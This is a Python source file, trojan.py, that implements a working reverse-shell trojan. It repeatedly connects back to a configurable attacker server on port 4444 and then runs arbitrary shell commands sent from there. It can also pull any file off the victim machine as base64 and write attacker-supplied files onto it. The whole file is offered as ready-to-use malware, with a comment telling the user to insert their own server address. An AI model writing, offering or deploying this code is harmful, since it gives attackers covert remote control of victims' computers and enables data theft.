# trojan.py
import socket
import subprocess
import os
import sys
import time
import base64
from threading import Thread

class Trojan:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    def connect(self):
        while True:
            try:
                self.socket.connect((self.host, self.port))
                print(f"[+] Connection established with {self.host}:{self.port}")
                self.receive_commands()
                break
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                time.sleep(5)
                try:
                    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                except:
                    pass
    
    def receive_commands(self):
        while True:
            try:
                command = self.socket.recv(1024).decode('utf-8')
                
                if not command:
                    break
                
                if command == "exit":
                    self.socket.close()
                    sys.exit()
                
                if command.startswith("cd "):
                    directory = command[3:]
                    try:
                        os.chdir(directory)
                        self.socket.send(f"[+] Changed directory to {directory}".encode('utf-8'))
                    except Exception as e:
                        self.socket.send(f"[-] Error changing directory: {e}".encode('utf-8'))
                elif command.startswith("download "):
                    filename = command[9:]
                    try:
                        with open(filename, "rb") as file:
                            data = file.read()
                            self.socket.send(base64.b64encode(data))
                    except Exception as e:
                        self.socket.send(f"[-] Error downloading file: {e}".encode('utf-8'))
                elif command.startswith("upload "):
                    parts = command.split(maxsplit=1)
                    if len(parts) < 2:
                        self.socket.send("[-] Usage: upload <filename>".encode('utf-8'))
                        continue
                    
                    filename = parts[1]
                    try:
                        file_data = self.socket.recv(4096)
                        with open(filename, "wb") as file:
                            file.write(base64.b64decode(file_data))
                        self.socket.send(f"[+] File {filename} uploaded successfully".encode('utf-8'))
                    except Exception as e:
                        self.socket.send(f"[-] Error uploading file: {e}".encode('utf-8'))
                else:
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        self.socket.send(output)
                    except Exception as e:
                        self.socket.send(f"[-] Error executing command: {e}".encode('utf-8'))
            except Exception as e:
                print(f"[-] Error receiving commands: {e}")
                self.socket.close()
                self.connect()
                break
    
    def start(self):
        self.connect()

if __name__ == "__main__":
    # Change these to your server's IP and port
    SERVER_HOST = "YOUR_SERVER_IP"
    SERVER_PORT = 4444
    
    trojan = Trojan(SERVER_HOST, SERVER_PORT)
    trojan.start()